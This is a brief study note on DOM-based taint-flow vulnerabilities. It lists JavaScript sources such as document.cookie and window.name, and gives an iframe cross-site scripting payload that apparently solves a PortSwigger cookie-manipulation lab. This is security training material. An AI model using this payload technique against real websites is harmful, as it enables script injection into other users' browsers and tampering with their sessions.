## Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
'''
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
'''

## LAB
- <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
- https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation 
